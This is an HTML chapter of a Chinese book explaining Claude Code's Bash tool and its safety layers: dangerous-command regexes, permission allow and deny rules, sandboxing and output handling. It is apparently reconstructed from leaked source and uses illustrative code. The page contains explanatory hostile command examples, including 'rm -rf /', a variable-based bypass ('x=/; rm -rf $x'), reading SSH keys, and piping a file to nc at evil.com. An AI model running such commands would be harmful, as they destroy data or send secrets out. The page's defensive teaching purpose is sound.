@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第13章 Bash 工具——最强大也最危险 - 解密 Claude Code</title>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4EGRH2BGC6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-4EGRH2BGC6');
+</script>
+<style>
+:root {
+  --sidebar-w:300px; --bg:#101418; --bg-side:#141a1e; --fg:#d4dde0;
+  --fg-dim:#8899a6; --accent:#00d4ff; --accent2:#20b2aa;
+  --code-bg:#181e24; --border:#283038; --hover:#1c2428; --radius:6px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--fg);line-height:1.85;font-size:15px;
+}
+
+/* ── 布局 ── */
+.layout{display:flex;min-height:100vh}
+.sidebar{
+  position:fixed;top:0;left:0;width:var(--sidebar-w);height:100vh;
+  background:var(--bg-side);border-right:1px solid var(--border);
+  overflow-y:auto;z-index:100;display:flex;flex-direction:column;
+}
+.sidebar-header{padding:1.4rem 1.2rem .8rem;border-bottom:1px solid var(--border);flex-shrink:0}
+.sidebar-header h1{font-size:1.05rem;color:var(--accent);margin:0;font-weight:700}
+.sidebar-header p{font-size:.72rem;color:var(--fg-dim);margin-top:.25rem}
+.sidebar-search{padding:.7rem 1.2rem;border-bottom:1px solid var(--border);flex-shrink:0}
+.sidebar-search input{
+  width:100%;padding:.4rem .7rem;background:var(--code-bg);
+  border:1px solid var(--border);border-radius:var(--radius);
+  color:var(--fg);font-size:.8rem;outline:none;
+}
+.sidebar-search input:focus{border-color:var(--accent)}
+.sidebar-search input::placeholder{color:var(--fg-dim)}
+.toc{padding:.5rem 0;overflow-y:auto;flex:1}
+.toc-group{
+  padding:.85rem 1.2rem .25rem;font-size:.68rem;font-weight:700;
+  color:var(--accent2);text-transform:uppercase;letter-spacing:.8px;
+}
+.toc-item{
+  display:block;padding:.3rem 1.2rem .3rem 1.5rem;font-size:.8rem;
+  color:var(--fg-dim);text-decoration:none;border-left:3px solid transparent;
+  transition:all .15s;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
+.toc-item:hover{color:var(--fg);background:var(--hover)}
+.toc-item.active{color:var(--accent);border-left-color:var(--accent);background:var(--hover);font-weight:600}
+.toc-item.hidden{display:none}
+.toc-item .read-dot{
+  display:inline-block;width:6px;height:6px;border-radius:50%;
+  margin-right:6px;flex-shrink:0;background:transparent;vertical-align:middle;
+}
+.toc-item .read-dot.done{background:#4ade80}
+
+/* ── 阅读进度面板 ── */
+.progress-panel{
+  border-top:1px solid var(--border);padding:.9rem 1.2rem;flex-shrink:0;
+}
+.progress-panel .progress-title{
+  display:flex;justify-content:space-between;align-items:center;
+  font-size:.72rem;color:var(--fg-dim);margin-bottom:.45rem;
+}
+.progress-panel .progress-title button{
+  background:none;border:none;color:var(--fg-dim);font-size:.68rem;
+  cursor:pointer;padding:0;text-decoration:underline;
+}
+.progress-panel .progress-title button:hover{color:var(--accent)}
+.progress-track{
+  width:100%;height:6px;background:var(--code-bg);border-radius:3px;overflow:hidden;
+}
+.progress-track .progress-fill{
+  height:100%;border-radius:3px;transition:width .4s;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+}
+.progress-panel .progress-text{
+  font-size:.7rem;color:var(--fg-dim);margin-top:.35rem;text-align:center;
+}
+.progress-panel .last-read{
+  font-size:.68rem;color:var(--fg-dim);margin-top:.5rem;padding-top:.45rem;
+  border-top:1px solid var(--border);
+}
+.progress-panel .last-read a{
+  color:var(--accent);font-size:.72rem;
+}
+
+/* ── 内容 ── */
+.content{margin-left:var(--sidebar-w);flex:1;min-width:0}
+.chapter{max-width:820px;margin:0 auto;padding:2.5rem 3rem 3rem}
+
+/* ── 排版 ── */
+h1{font-size:1.8rem;color:var(--accent);margin:1.5rem 0 1rem;padding-bottom:.5rem;border-bottom:2px solid var(--accent);line-height:1.3}
+h2{font-size:1.3rem;color:#7ec8e3;margin:2rem 0 .7rem;padding-bottom:.3rem;border-bottom:1px solid var(--border)}
+h3{font-size:1.08rem;color:#a8d8ea;margin:1.5rem 0 .5rem}
+h4{font-size:1rem;color:#b8c8d0;margin:1.2rem 0 .4rem}
+p{margin:.7rem 0}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+strong{color:#fff;font-weight:600}
+em{color:#a0b4be}
+
+/* ── 代码 ── */
+code{
+  background:var(--code-bg);padding:.14em .42em;border-radius:4px;
+  font-size:.87em;font-family:"JetBrains Mono","Fira Code","SF Mono",Menlo,monospace;color:#e0c080;
+}
+pre{
+  background:var(--code-bg);padding:1rem 1.2rem;border-radius:var(--radius);
+  overflow-x:auto;margin:1rem 0;border:1px solid var(--border);line-height:1.55;
+}
+pre code{background:none;padding:0;color:var(--fg);font-size:.84em}
+
+/* ── 表格 ── */
+table{border-collapse:collapse;width:100%;margin:1rem 0;font-size:.9em}
+th,td{border:1px solid var(--border);padding:.45rem .75rem;text-align:left}
+th{background:var(--code-bg);color:var(--accent);font-weight:600;font-size:.86em}
+tr:hover td{background:rgba(255,255,255,.02)}
+
+/* ── 引用 / 列表 / 其他 ── */
+blockquote{border-left:4px solid var(--accent2);padding:.4rem 1rem;margin:1rem 0;color:var(--fg-dim);background:rgba(32,178,170,.08);border-radius:0 var(--radius) var(--radius) 0}
+blockquote p{margin:.25rem 0}
+ul,ol{padding-left:1.5rem;margin:.5rem 0}
+li{margin:.25rem 0}
+hr{border:none;border-top:1px solid var(--border);margin:2.5rem 0}
+img{max-width:100%;border-radius:var(--radius)}
+
+/* ── 下载按钮 ── */
+.download-buttons{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;margin:1rem 0}
+.dl-btn{
+  display:inline-block;padding:.65rem 1.8rem;border-radius:var(--radius);
+  font-size:.95rem;font-weight:600;text-decoration:none;transition:all .2s;
+  border:2px solid var(--border);
+}
+.dl-btn:hover{text-decoration:none}
+.dl-start{background:var(--accent);color:#000;border-color:var(--accent)}
+.dl-start:hover{background:#00bfe0;border-color:#00bfe0;color:#000}
+.dl-pdf{background:transparent;color:var(--fg);border-color:var(--accent)}
+.dl-pdf:hover{background:var(--accent);border-color:var(--accent);color:#000}
+.dl-epub{background:transparent;color:var(--fg);border-color:var(--border)}
+.dl-epub:hover{border-color:var(--accent);color:var(--accent)}
+.version-info{font-size:.8rem;color:var(--fg-dim)}
+
+/* ── 翻页导航 ── */
+.page-nav{
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;
+  margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);
+}
+.page-nav a{
+  display:inline-flex;align-items:center;gap:.4rem;
+  padding:.55rem 1.1rem;border-radius:var(--radius);
+  background:var(--code-bg);border:1px solid var(--border);
+  color:var(--fg);font-size:.85rem;text-decoration:none;transition:all .2s;
+  max-width:45%;
+}
+.page-nav a:hover{border-color:var(--accent);color:var(--accent)}
+.page-nav a span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.page-nav .spacer{flex:1}
+
+/* ── 进度条 ── */
+.progress-bar{position:fixed;top:0;left:var(--sidebar-w);right:0;height:3px;z-index:110}
+.progress-bar .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .1s}
+
+/* ── 回到顶部 ── */
+.back-top{
+  position:fixed;bottom:2rem;right:2rem;width:2.4rem;height:2.4rem;border-radius:50%;
+  background:var(--accent2);color:#fff;border:none;font-size:1rem;cursor:pointer;
+  opacity:0;transition:opacity .3s;display:flex;align-items:center;justify-content:center;z-index:80;
+}
+.back-top.show{opacity:.8}
+.back-top:hover{opacity:1}
+
+/* ── 移动端 ── */
+.menu-btn{
+  display:none;position:fixed;top:.7rem;left:.7rem;z-index:200;
+  background:var(--bg-side);border:1px solid var(--border);border-radius:var(--radius);
+  color:var(--accent);font-size:1.2rem;width:2.4rem;height:2.4rem;cursor:pointer;
+  align-items:center;justify-content:center;
+}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:90}
+@media(max-width:900px){
+  :root{--sidebar-w:270px}
+  .chapter{padding:2rem 1.5rem 2.5rem}
+}
+@media(max-width:700px){
+  .sidebar{transform:translateX(-100%);transition:transform .3s}
+  .sidebar.open{transform:translateX(0)}
+  .content{margin-left:0}
+  .menu-btn{display:flex}
+  .overlay.show{display:block}
+  .chapter{padding:3.2rem 1.1rem 2.5rem}
+  .progress-bar{left:0}
+  h1{font-size:1.45rem} h2{font-size:1.15rem}
+}
+</style>
+</head>
+<body>
+
+<button class="menu-btn" onclick="toggleSidebar()">&#9776;</button>
+<div class="overlay" onclick="toggleSidebar()"></div>
+<div class="progress-bar"><div class="bar"></div></div>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="sidebar-header">
+      <h1><a href="/" style="color:inherit;text-decoration:none">解密 Claude Code</a></h1>
+      <p>AI 编程助手的源码之旅</p>
+    </div>
+    <div class="sidebar-search">
+      <input type="text" placeholder="搜索章节..." oninput="filterToc(this.value)">
+    </div>
+    <div class="toc"><a class="toc-item" href="cover.html" data-cid="cover"><span class="read-dot" data-cid="cover"></span>封面</a>
+<a class="toc-item" href="preface.html" data-cid="preface"><span class="read-dot" data-cid="preface"></span>前言</a>
+<div class="toc-group">第一部分 起步篇</div>
+<a class="toc-item" href="ch01.html" data-cid="ch01"><span class="read-dot" data-cid="ch01"></span>第1章 欢迎来到 Claude Code 的世界</a>
+<a class="toc-item" href="ch02.html" data-cid="ch02"><span class="read-dot" data-cid="ch02"></span>第2章 源码全景地图</a>
+<a class="toc-item" href="ch03.html" data-cid="ch03"><span class="read-dot" data-cid="ch03"></span>第3章 从零理解 TypeScript 与 React</a>
+<div class="toc-group">第二部分 核心架构篇</div>
+<a class="toc-item" href="ch04.html" data-cid="ch04"><span class="read-dot" data-cid="ch04"></span>第4章 程序的大门——入口文件解析</a>
+<a class="toc-item" href="ch05.html" data-cid="ch05"><span class="read-dot" data-cid="ch05"></span>第5章 终端里的 React——Ink 框架揭秘</a>
+<a class="toc-item" href="ch06.html" data-cid="ch06"><span class="read-dot" data-cid="ch06"></span>第6章 状态管理——程序的“记忆”</a>
+<a class="toc-item" href="ch07.html" data-cid="ch07"><span class="read-dot" data-cid="ch07"></span>第7章 命令系统——斜杠的魔法</a>
+<div class="toc-group">第三部分 对话引擎篇</div>
+<a class="toc-item" href="ch08.html" data-cid="ch08"><span class="read-dot" data-cid="ch08"></span>第8章 与 AI 对话的秘密——消息系统</a>
+<a class="toc-item" href="ch09.html" data-cid="ch09"><span class="read-dot" data-cid="ch09"></span>第9章 查询引擎——大脑中枢</a>
+<a class="toc-item" href="ch10.html" data-cid="ch10"><span class="read-dot" data-cid="ch10"></span>第10章 流式响应——逐字显示的魔法</a>
+<a class="toc-item" href="ch11.html" data-cid="ch11"><span class="read-dot" data-cid="ch11"></span>第11章 上下文管理——有限的记忆</a>
+<div class="toc-group">第四部分 工具系统篇</div>
+<a class="toc-item" href="ch12.html" data-cid="ch12"><span class="read-dot" data-cid="ch12"></span>第12章 工具的世界——从设计到实现</a>
+<a class="toc-item active" href="ch13.html" data-cid="ch13"><span class="read-dot" data-cid="ch13"></span>第13章 Bash 工具——最强大也最危险</a>
+<a class="toc-item" href="ch14.html" data-cid="ch14"><span class="read-dot" data-cid="ch14"></span>第14章 文件三剑客——Read、Write、Edit</a>
+<a class="toc-item" href="ch15.html" data-cid="ch15"><span class="read-dot" data-cid="ch15"></span>第15章 搜索双雄——Grep 与 Glob</a>
+<a class="toc-item" href="ch16.html" data-cid="ch16"><span class="read-dot" data-cid="ch16"></span>第16章 Agent 工具——AI 的分身术</a>
+<div class="toc-group">第五部分 安全与权限篇</div>
+<a class="toc-item" href="ch17.html" data-cid="ch17"><span class="read-dot" data-cid="ch17"></span>第17章 权限系统——信任的层级</a>
+<a class="toc-item" href="ch18.html" data-cid="ch18"><span class="read-dot" data-cid="ch18"></span>第18章 安全防线——危险命令检测</a>
+<a class="toc-item" href="ch19.html" data-cid="ch19"><span class="read-dot" data-cid="ch19"></span>第19章 沙箱机制——隔离的艺术</a>
+<div class="toc-group">第六部分 扩展与集成篇</div>
+<a class="toc-item" href="ch20.html" data-cid="ch20"><span class="read-dot" data-cid="ch20"></span>第20章 MCP 协议——工具的万能接口</a>
+<a class="toc-item" href="ch21.html" data-cid="ch21"><span class="read-dot" data-cid="ch21"></span>第21章 Hook 系统——可编程的钩子</a>
+<a class="toc-item" href="ch22.html" data-cid="ch22"><span class="read-dot" data-cid="ch22"></span>第22章 IDE 桥接——编辑器中的 AI</a>
+<a class="toc-item" href="ch23.html" data-cid="ch23"><span class="read-dot" data-cid="ch23"></span>第23章 插件与技能——无限扩展</a>
+<div class="toc-group">第七部分 高级话题篇</div>
+<a class="toc-item" href="ch24.html" data-cid="ch24"><span class="read-dot" data-cid="ch24"></span>第24章 多智能体——AI 的团队协作</a>
+<a class="toc-item" href="ch25.html" data-cid="ch25"><span class="read-dot" data-cid="ch25"></span>第25章 性能优化——毫秒必争</a>
+<a class="toc-item" href="ch26.html" data-cid="ch26"><span class="read-dot" data-cid="ch26"></span>第26章 持久化记忆——跨会话的智慧</a>
+<a class="toc-item" href="ch27.html" data-cid="ch27"><span class="read-dot" data-cid="ch27"></span>第27章 配置系统——千人千面</a>
+<div class="toc-group">第八部分 总结篇</div>
+<a class="toc-item" href="ch28.html" data-cid="ch28"><span class="read-dot" data-cid="ch28"></span>第28章 架构之美——设计模式总结</a>
+<a class="toc-item" href="ch29.html" data-cid="ch29"><span class="read-dot" data-cid="ch29"></span>第29章 从源码到产品——工程实践启示</a>
+<a class="toc-item" href="ch30.html" data-cid="ch30"><span class="read-dot" data-cid="ch30"></span>第30章 你的下一步——成为更好的程序员</a>
+<div class="toc-group">附录</div>
+<a class="toc-item" href="appendix-a.html" data-cid="appendix-a"><span class="read-dot" data-cid="appendix-a"></span>附录 A 术语表</a>
+<a class="toc-item" href="appendix-b.html" data-cid="appendix-b"><span class="read-dot" data-cid="appendix-b"></span>附录 B 源码关键文件索引</a>
+<a class="toc-item" href="appendix-c.html" data-cid="appendix-c"><span class="read-dot" data-cid="appendix-c"></span>附录 C 全书知识地图</a>
+<a class="toc-item" href="about.html" data-cid="about"><span class="read-dot" data-cid="about"></span>关于本书</a></div>
+    <div class="progress-panel">
+      <div class="progress-title">
+        <span>阅读进度</span>
+        <button onclick="clearProgress()">清除记录</button>
+      </div>
+      <div class="progress-track"><div class="progress-fill" id="readFill"></div></div>
+      <div class="progress-text" id="readText">0 / 0 章</div>
+      <div class="last-read" id="lastRead"></div>
+    </div>
+  </nav>
+
+  <main class="content">
+    <article class="chapter">
+<h1 id="ch13-h1">第13章：Bash 工具——最强大也最危险</h1>
+
+<h2 id="ch13-h2">为什么 Bash 工具特殊？</h2>
+
+<p>在所有工具中，Bash 工具是最强大的——它可以执行任意终端命令。这意味着它几乎能做任何事：安装软件包、运行测试、提交代码、甚至删除文件。</p>
+
+<p>但&quot;能做任何事&quot;也意味着它<strong>最危险</strong>。一个 <code>rm -rf /</code> 命令就能删掉整个磁盘。因此，Bash 工具的实现是所有工具中最复杂的，安全检查代码比功能代码还多。</p>
+
+<h2 id="ch13-h3">基本实现</h2>
+
+<p>Bash 工具的核心功能其实很简单：</p>
+
+<pre><code class="language-typescript">
+async function executeBash(command: string, timeout?: number) {
+  const process = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], {
+    cwd: workingDirectory,
+    timeout: timeout || 120000,  // 默认 2 分钟超时
+  })
+
+  let stdout = &quot;&quot;
+  let stderr = &quot;&quot;
+
+  process.stdout.on(&quot;data&quot;, (data) =&gt; { stdout += data })
+  process.stderr.on(&quot;data&quot;, (data) =&gt; { stderr += data })
+
+  const exitCode = await waitForExit(process)
+
+  return { stdout, stderr, exitCode }
+}
+</code></pre>
+
+<p>就是启动一个子进程，执行命令，收集输出。几十行代码就能搞定。</p>
+
+<p>但围绕这个核心功能，有超过 50 万行的安全、权限、沙箱代码。让我们看看为什么。</p>
+
+<h2 id="ch13-h4">危险命令检测</h2>
+
+<p>Claude Code 维护了一个&quot;危险命令&quot;模式列表：</p>
+
+<pre><code class="language-typescript">
+const DANGEROUS_PATTERNS = [
+  // 文件删除
+  /rm\s+(-[rf]+\s+)*\//,           // rm -rf /
+  /rm\s+(-[rf]+\s+)*~/,            // rm -rf ~
+
+  // 磁盘操作
+  /mkfs\./,                          // mkfs.ext4（格式化磁盘）
+  /dd\s+if=.*of=\/dev/,             // dd 写入设备
+
+  // 系统破坏
+  /chmod\s+777\s+\//,               // 开放所有权限
+  /&gt;\s*\/dev\/sda/,                  // 覆写磁盘
+
+  // 密钥泄露
+  /cat.*\.ssh\/.*key/,              // 读取 SSH 密钥
+  /echo.*&gt;.*authorized_keys/,       // 修改授权密钥
+]
+</code></pre>
+
+<p>当检测到危险模式时，系统会：</p>
+<ol>
+<li>1. 阻止自动执行</li>
+<li>2. 向用户显示警告</li>
+<li>3. 要求用户明确确认</li>
+</ol>
+
+<p>但模式匹配不是万能的。一个聪明的命令可能绕过检测：</p>
+
+<pre><code class="language-bash">
+# 这个会被检测到
+rm -rf /
+
+# 这个可能不会（通过变量间接引用）
+x=/; rm -rf $x
+</code></pre>
+
+<p>所以 Claude Code 还有更深层的安全措施。</p>
+
+<h2 id="ch13-h5">命令分析：不只是字符串匹配</h2>
+
+<p>对于复杂的命令，简单的正则表达式不够用。Claude Code 会对命令进行更深入的分析：</p>
+
+<pre><code class="language-typescript">
+function analyzeCommand(command: string) {
+  // 1. 分解管道命令
+  const pipes = command.split(&quot;|&quot;).map(s =&gt; s.trim())
+
+  // 2. 分析每个子命令
+  for (const subCommand of pipes) {
+    const [executable, ...args] = parseShellArgs(subCommand)
+
+    // 3. 检查可执行文件
+    if (isDangerousExecutable(executable)) {
+      return { safe: false, reason: `${executable} 是危险命令` }
+    }
+
+    // 4. 检查参数
+    if (hasDangerousArgs(executable, args)) {
+      return { safe: false, reason: `参数组合有风险` }
+    }
+
+    // 5. 检查路径
+    for (const arg of args) {
+      if (isPathOutsideWorkdir(arg)) {
+        return { safe: false, reason: `路径超出工作目录` }
+      }
+    }
+  }
+
+  return { safe: true }
+}
+</code></pre>
+
+<h3 id="ch13-h6">sed 命令的特殊处理</h3>
+
+<p><code>sed</code> 是一个文本处理命令，常用来批量替换文件内容。它特别需要关注，因为它可以修改文件：</p>
+
+<pre><code class="language-bash">
+# 修改文件内容（in-place）
+sed -i &#x27;s/old/new/g&#x27; file.txt
+</code></pre>
+
+<p>Claude Code 有专门的 sed 解析器（21,000 行代码！），它能理解 sed 命令的具体操作：</p>
+
+<pre><code class="language-typescript">
+function analyzeSedCommand(command: string) {
+  // 解析 sed 表达式
+  const sedScript = parseSedScript(command)
+
+  // 检查：有 -i 标志吗？（会修改文件）
+  if (sedScript.inPlace) {
+    return { isReadOnly: false, modifiesFile: true }
+  }
+
+  // 没有 -i 就是只读的（只输出不修改）
+  return { isReadOnly: true, modifiesFile: false }
+}
+</code></pre>
+
+<h2 id="ch13-h7">权限规则</h2>
+
+<p>Bash 工具的权限系统支持细粒度的规则：</p>
+
+<pre><code class="language-json">
+{
+  &quot;permissions&quot;: {
+    &quot;alwaysAllow&quot;: [
+      &quot;Bash(git *)&quot;,        // 允许所有 git 命令
+      &quot;Bash(npm test *)&quot;,   // 允许 npm test
+      &quot;Bash(ls *)&quot;,         // 允许 ls
+      &quot;Bash(cat *)&quot;         // 允许 cat
+    ],
+    &quot;alwaysDeny&quot;: [
+      &quot;Bash(rm -rf *)&quot;,     // 禁止 rm -rf
+      &quot;Bash(curl * | bash)&quot; // 禁止从网上下载并执行脚本
+    ],
+    &quot;alwaysAsk&quot;: [
+      &quot;Bash(git push *)&quot;,   // push 前总是询问
+      &quot;Bash(npm publish *)&quot; // 发布前总是询问
+    ]
+  }
+}
+</code></pre>
+
+<p>规则使用通配符 <code>*</code> 来匹配：</p>
+
+<pre><code>
+&quot;Bash(git *)&quot; 匹配:
+  ✅ git status
+  ✅ git push origin main
+  ✅ git log --oneline
+  ❌ gitk（不是以 &quot;git &quot; 开头）
+</code></pre>
+
+<p>规则按优先级执行：deny &gt; ask &gt; allow。也就是说，如果一个命令同时匹配了 allow 和 deny 规则，deny 优先。</p>
+
+<h2 id="ch13-h8">沙箱模式</h2>
+
+<p>在某些环境下，Bash 命令在<strong>沙箱</strong>中执行。沙箱就像一个&quot;隔离房间&quot;——命令在里面运行，不能影响外面的世界。</p>
+
+<pre><code>
+┌─────────────────────────────────┐
+│           沙箱                   │
+│                                  │
+│  command → 只能访问工作目录       │
+│           不能访问系统文件        │
+│           不能修改网络设置        │
+│           不能安装全局软件        │
+│                                  │
+└─────────────────────────────────┘
+</code></pre>
+
+<p>沙箱的实现取决于操作系统：</p>
+<ul>
+<li>- <strong>macOS</strong>：使用 <code>sandbox-exec</code> 或 Apple 的 App Sandbox</li>
+<li>- <strong>Linux</strong>：使用 <code>firejail</code> 或 Docker 容器</li>
+</ul>
+
+<h2 id="ch13-h9">输出处理</h2>
+
+<p>Bash 命令的输出可能非常大。比如 <code>find /</code> 可能输出几百万行。Claude Code 需要处理这种情况：</p>
+
+<pre><code class="language-typescript">
+async function handleBashOutput(process, maxSize = 1_000_000) {
+  let output = &quot;&quot;
+  let truncated = false
+
+  for await (const chunk of process.stdout) {
+    output += chunk
+
+    if (output.length &gt; maxSize) {
+      output = output.slice(0, maxSize)
+      truncated = true
+      process.kill()  // 停止命令，不再读取更多输出
+      break
+    }
+  }
+
+  if (truncated) {
+    output += `\n\n[输出已截断，只显示前 ${maxSize} 个字符]`
+  }
+
+  return output
+}
+</code></pre>
+
+<h2 id="ch13-h10">进度显示</h2>
+
+<p>长时间运行的命令会实时显示输出：</p>
+
+<pre><code>
+&gt; Running: npm install
+  ⠋ Installing dependencies...
+  added 1,234 packages in 45s
+
+  12 packages are looking for funding
+    run `npm fund` for details
+</code></pre>
+
+<p>这通过流式读取子进程的输出来实现：</p>
+
+<pre><code class="language-typescript">
+async function* streamBashOutput(process) {
+  for await (const chunk of process.stdout) {
+    yield { type: &quot;bash_progress&quot;, partial_output: chunk }
+  }
+}
+</code></pre>
+
+<p>每收到一块输出，就通过 <code>onProgress</code> 回调发送给界面，让用户实时看到命令的执行情况。</p>
+
+<h2 id="ch13-h11">超时与后台执行</h2>
+
+<pre><code class="language-typescript">
+// 默认超时：2 分钟
+const DEFAULT_TIMEOUT = 120_000
+
+// 用户可以指定更长的超时
+const timeout = input.timeout || DEFAULT_TIMEOUT
+
+// 后台执行（不阻塞交互）
+if (input.run_in_background) {
+  spawnBackground(command)
+  return { data: &quot;命令已在后台启动&quot; }
+}
+</code></pre>
+
+<p>有些命令需要运行很长时间（比如编译大项目）。后台执行模式让用户可以继续和 AI 对话，命令在后台默默运行。</p>
+
+<h2 id="ch13-h12">只读模式检测</h2>
+
+<p>Claude Code 需要判断一个命令是&quot;只读的&quot;（只看不改）还是&quot;可写的&quot;（会修改东西）：</p>
+
+<pre><code class="language-typescript">
+const READ_ONLY_COMMANDS = [
+  &quot;ls&quot;, &quot;cat&quot;, &quot;head&quot;, &quot;tail&quot;, &quot;wc&quot;,
+  &quot;grep&quot;, &quot;find&quot;, &quot;which&quot;, &quot;pwd&quot;,
+  &quot;echo&quot;, &quot;date&quot;, &quot;whoami&quot;,
+  &quot;git status&quot;, &quot;git log&quot;, &quot;git diff&quot;,
+  &quot;npm list&quot;, &quot;node --version&quot;,
+]
+
+function isReadOnlyCommand(command: string): boolean {
+  const executable = command.split(/\s+/)[0]
+  return READ_ONLY_COMMANDS.some(cmd =&gt;
+    command.startsWith(cmd)
+  )
+}
+</code></pre>
+
+<p>只读命令可以：</p>
+<ul>
+<li>- 跳过某些权限检查（提高速度）</li>
+<li>- 并行执行（不会互相影响）</li>
+<li>- 在权限受限模式下仍然允许</li>
+</ul>
+
+<h2 id="ch13-h13">本章小结</h2>
+
+<ul>
+<li>- Bash 工具是最强大也最危险的工具</li>
+<li>- 安全措施包括：危险命令检测、命令分析、sed 解析、权限规则、沙箱</li>
+<li>- 权限规则支持通配符，优先级：deny &gt; ask &gt; allow</li>
+<li>- 输出处理：截断大输出、流式进度显示</li>
+<li>- 支持超时控制和后台执行</li>
+<li>- 只读检测影响权限和并发策略</li>
+</ul>
+
+<h2 id="ch13-h14">思考题</h2>
+
+<ol>
+<li>1. 如果你是攻击者，你能想到什么方式绕过危险命令检测？（这是安全研究人员常做的工作）</li>
+<li>2. 为什么权限规则的优先级是 deny &gt; ask &gt; allow 而不是反过来？</li>
+<li>3. 沙箱模式有什么缺点？（提示：有些合法操作也会被限制）</li>
+</ol>
+
+<h2 id="ch13-h15">编程挑战：设计你自己的安全检测</h2>
+
+<p>如果你想练习安全思维，试试这个挑战：</p>
+
+<p>设计一个函数 <code>isSafeCommand(command: string): boolean</code>，它接收一个 bash 命令，返回是否安全。</p>
+
+<p><strong>Level 1</strong>：检测明显的危险命令（<code>rm -rf /</code>、<code>mkfs</code> 等）</p>
+<p><strong>Level 2</strong>：检测路径穿越（<code>../../../etc/passwd</code>）</p>
+<p><strong>Level 3</strong>：检测管道中的危险操作（<code>cat file | nc evil.com 1234</code>）</p>
+<p><strong>Level 4</strong>：检测通过变量间接执行的危险（<code>x=/; rm -rf $x</code>）</p>
+
+<p>每个 Level 的难度都会增加。你会发现，越深入就越难——这就是为什么 Claude Code 的安全代码有 50 万行。</p>
+
+<p>安全不是一个可以&quot;完全解决&quot;的问题——它是一场永无止境的猫鼠游戏。但每多一层检测，就多一分安全。</p>
+
+<p>下一章，我们将看看文件操作的三个工具：Read、Write 和 Edit。</p>
+
+<hr/>
+
+<p><em>本书由 everettjf 使用 Claude Code 分析泄露源码编写 | 保留出处即可自由转载</em></p>
+
+    </article>
+    <nav class="chapter page-nav">
+      <a href="ch12.html" data-dir="prev"><span>&#8592;</span> <span>第12章 工具的世界——从设计到实现</span></a>
+      <span class="spacer"></span>
+      <a href="ch14.html" data-dir="next"><span>第14章 文件三剑客——Read、Write、Edit</span> <span>&#8594;</span></a>
+    </nav>
+  </main>
+</div>
+
+<button class="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">&#8593;</button>
+
+<script>
+// ── 基础交互 ──
+function toggleSidebar(){
+  document.querySelector('.sidebar').classList.toggle('open');
+  document.querySelector('.overlay').classList.toggle('show');
+}
+function filterToc(q){
+  q=q.toLowerCase();
+  document.querySelectorAll('.toc-item').forEach(a=>{
+    a.classList.toggle('hidden',q&&!a.textContent.toLowerCase().includes(q));
+  });
+}
+window.addEventListener('scroll',()=>{
+  const h=document.documentElement;
+  const pct=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100;
+  document.querySelector('.progress-bar .bar').style.width=pct+'%';
+  document.querySelector('.back-top').classList.toggle('show',h.scrollTop>400);
+},{passive:true});
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='INPUT')return;
+  if(e.key==='ArrowLeft'){ const a=document.querySelector('.page-nav a[data-dir=prev]'); if(a) a.click(); }
+  if(e.key==='ArrowRight'){ const a=document.querySelector('.page-nav a[data-dir=next]'); if(a) a.click(); }
+});
+
+// ── 阅读进度（localStorage）──
+const STORAGE_KEY = 'dcc_read_progress';
+const CURRENT_CID = 'ch13';
+const ALL_CIDS = ["cover", "preface", "ch01", "ch02", "ch03", "ch04", "ch05", "ch06", "ch07", "ch08", "ch09", "ch10", "ch11", "ch12", "ch13", "ch14", "ch15", "ch16", "ch17", "ch18", "ch19", "ch20", "ch21", "ch22", "ch23", "ch24", "ch25", "ch26", "ch27", "ch28", "ch29", "ch30", "appendix-a", "appendix-b", "appendix-c", "about"];
+const TOTAL = ALL_CIDS.length;
+
+function getProgress(){
+  try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {}; }
+  catch { return {}; }
+}
+function saveProgress(p){
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(p));
+}
+
+// 标记当前章节为已读
+function markRead(){
+  const p = getProgress();
+  if(!p[CURRENT_CID]){
+    p[CURRENT_CID] = new Date().toISOString();
+    saveProgress(p);
+  }
+  renderProgress();
+}
+
+// 清除全部进度
+function clearProgress(){
+  if(!confirm('确定要清除所有阅读记录吗？')) return;
+  localStorage.removeItem(STORAGE_KEY);
+  renderProgress();
+}
+
+// 渲染进度 UI
+function renderProgress(){
+  const p = getProgress();
+  const readCount = ALL_CIDS.filter(id => p[id]).length;
+  const pct = TOTAL ? Math.round(readCount / TOTAL * 100) : 0;
+
+  // 进度条
+  const fill = document.getElementById('readFill');
+  const text = document.getElementById('readText');
+  if(fill) fill.style.width = pct + '%';
+  if(text) text.textContent = readCount + ' / ' + TOTAL + ' 章（' + pct + '%）';
+
+  // 侧边栏已读标记
+  document.querySelectorAll('.read-dot').forEach(dot => {
+    dot.classList.toggle('done', !!p[dot.dataset.cid]);
+  });
+
+  // 上次阅读
+  const lastEl = document.getElementById('lastRead');
+  if(lastEl){
+    const entries = Object.entries(p).sort((a,b) => b[1].localeCompare(a[1]));
+    if(entries.length > 0){
+      const [lastCid, lastTime] = entries[0];
+      const link = document.querySelector('.toc-item[data-cid="'+lastCid+'"]');
+      const title = link ? link.textContent.trim() : lastCid;
+      const d = new Date(lastTime);
+      const timeStr = d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0')
